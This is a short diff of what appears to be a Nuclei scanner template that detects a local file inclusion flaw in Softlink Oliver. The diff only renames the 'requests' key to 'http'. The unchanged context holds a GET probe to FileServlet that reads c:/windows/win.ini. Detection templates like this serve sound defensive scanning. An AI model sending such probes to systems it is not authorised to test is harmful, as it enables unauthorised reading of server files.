@@ -10,7 +10,7 @@ info:
     - https://www.softlinkint.com/product/oliver/
   tags: windows,lfi,oliver
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini"
